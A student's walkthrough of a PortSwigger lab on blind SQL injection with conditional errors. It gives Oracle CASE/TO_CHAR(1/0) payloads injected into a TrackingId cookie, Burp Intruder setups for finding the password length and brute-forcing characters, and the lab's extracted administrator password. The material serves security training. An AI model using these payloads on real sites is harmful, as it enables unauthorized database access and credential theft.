# **Lab: Blind SQL injection with conditional errors** - [Link](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)


**Goal:**
Exploit a blind SQL injection vulnerability that **reveals errors on condition** to extract the administrator’s password and log in.


## **Step-by-step:**

### 1. Confirm Blind SQLi with Conditional Errors

Inject into the `TrackingId` cookie:

* `' or 1=1--` → 200 OK
* `' or 1=2--` → 200 OK
* `' and 1=1--` → 200 OK
* `' and 1=2--` → 200 OK

Then i searched online and found the following **conditional error-based payloads**:

```sql
SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```
This will **cause a division-by-zero error** when condition is true.

Try:

* `' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)--` → ✅ 200 OK
* `' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)--` → ❌ 500 Internal Server Error

→ The error is **triggered only when condition is true**. We can use this to extract data.


### 2. Confirm Target Table

Challenge says there's a `users` table with `username` and `password`.

Use the query on a specific row:

```sql
' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
```

→ ✅ 200 OK
So, the row for `administrator` exists.

---

### 3. Find Password Length

Use this pattern:

```sql
' || (SELECT CASE WHEN (LENGTH(password)=N) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
```
Here, N = Natural number

Use **Burp Intruder** to automate:

* **Sniper Attack**
* **Payload position:** N
* **Payload type:** Numbers (from 1 to 30)

📌 Payload example:

```
TrackingId=xClmxDIEkzdbdGdj'+||+(SELECT+CASE+WHEN+(length(password)%3d§1§)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')--;
```

Response gives 500 error only for **20** → Password length = **20**


### 4. Extract Password (1 char at a time)

Use `SUBSTR()` to extract character at a specific position:

```sql
SUBSTR(password, position, 1)
```

Test like:

```sql
' || (SELECT CASE WHEN (SUBSTR(password, 1, 1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
```

Now automate using **Burp Intruder**:

* **Attack type:** Cluster Bomb
* **Payload positions:**

  * `$1$` → Numbers (1 to 20)
  * `$a$` → Brute forcer (minlen 1, maxlen 1)

Example payload:

```
TrackingId=xClmxDIEkzdbdGdj' || (SELECT CASE WHEN (SUBSTR(password,$1$,1)='$a$') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--;
```

Find which character causes **500 error** for each position.


### 5. Final Result

Extracted password:

```
0w1gth039w6at3o1fb95
```

Login with:

* **Username:** administrator
* **Password:** 0w1gth039w6at3o1fb95


**Lab Solved**
